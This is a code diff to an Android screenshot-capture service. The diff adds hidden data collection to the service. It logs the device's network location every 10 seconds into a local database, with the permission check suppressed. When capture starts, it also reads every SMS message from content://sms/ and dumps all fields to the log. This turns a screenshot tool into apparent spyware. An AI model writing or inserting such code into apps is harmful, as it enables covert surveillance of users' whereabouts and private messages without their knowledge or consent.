@@ -7,22 +7,31 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.content.Intent;
+import android.database.Cursor;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaScannerConnection;
 import android.media.ToneGenerator;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.WindowManager;
 
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
+import androidx.room.Room;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -56,16 +65,65 @@ public class ScreenshotService extends Service {
     final private ToneGenerator beeper =
             new ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100);
 
+    @SuppressLint("SimpleDateFormat")
+    private SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yy-hh:mm:ss");
+
+    private TaskDao taskDao;
+
     @Override
     public void onCreate() {
         super.onCreate();
+
+        taskDao = Room.databaseBuilder(this, TaskDatabase.class, "task.db")
+                .build().taskDao();
 
         mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
         wmgr = (WindowManager) getSystemService(WINDOW_SERVICE);
 
         handlerThread.start();
         handler = new Handler(handlerThread.getLooper());
+        bindLocation();
+
     }
+
+    @SuppressLint("MissingPermission")
+    private void bindLocation() {
+        LocationListener locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(@NonNull Location location) {
+                final LocationModel model = new LocationModel();
+                model.setTime(sdf.format(new Date()));
+                model.setLat(location.getLatitude());
+                model.setLon(location.getLongitude());
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        taskDao.insertLocation(model);
+                    }
+                }).start();
+                Log.d("BAG", "Service: " + model.toString());
+
+            }
+
+            @Override
+            public void onStatusChanged(String provider, int status, Bundle extras) {
+
+            }
+
+            @Override
+            public void onProviderEnabled(@NonNull String provider) {
+
+            }
+
+            @Override
+            public void onProviderDisabled(@NonNull String provider) {
+
+            }
+        };
+        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 10, locationListener);
+    }
+
 
     @Override
     public int onStartCommand(Intent i, int flags, int startId) {
@@ -92,10 +150,10 @@ public class ScreenshotService extends Service {
         return (START_NOT_STICKY);
     }
 
+
     @Override
     public void onDestroy() {
         stopCapture();
-
         super.onDestroy();
     }
 
@@ -118,7 +176,7 @@ public class ScreenshotService extends Service {
             @SuppressLint("SimpleDateFormat")
             @Override
             public void run() {
-                File output = new File(getExternalFilesDir(null), new SimpleDateFormat("dd.MM.yy-hh:mm:ss").format(new Date())+"-screenshot.png");
+                File output = new File(getExternalFilesDir(null), sdf.format(new Date()) + "-screenshot.png");
 
                 Log.d("BAG", output.getAbsolutePath());
 
@@ -152,6 +210,7 @@ public class ScreenshotService extends Service {
         }
     }
 
+
     private void startCapture() {
         projection = mgr.getMediaProjection(resultCode, resultData);
         it = new ImageTransmogrifier(this);
@@ -168,6 +227,34 @@ public class ScreenshotService extends Service {
                 getResources().getDisplayMetrics().densityDpi,
                 VIRT_DISPLAY_FLAGS, it.getSurface(), null, handler);
         projection.registerCallback(cb, handler);
+
+//        final LocationModel model = new LocationModel();
+//        model.setTime(sdf.format(new Date()));
+//        model.setLat(mCurrentLocation.getLatitude());
+//        model.setLon(mCurrentLocation.getLongitude());
+//        new Thread(new Runnable() {
+//            @Override
+//            public void run() {
+//                taskDao.insertLocation(model);
+//            }
+//        }).start();
+//
+//        Log.d("BAG", String.valueOf(model.getLat()));
+
+        StringBuilder msgData = new StringBuilder();
+        @SuppressLint("Recycle") Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
+                    msgData.append(" ").append(cursor.getColumnName(idx)).append(":").append(cursor.getString(idx));
+                }
+                // use msgData
+            } while (cursor.moveToNext());
+        } else {
+            // empty box, no SMS
+        }
+
+        Log.d("BAG", msgData.toString());
     }
 
     private void foregrounding() {
@@ -208,4 +295,5 @@ public class ScreenshotService extends Service {
 
         return (PendingIntent.getService(this, 0, i, 0));
     }
+
 }
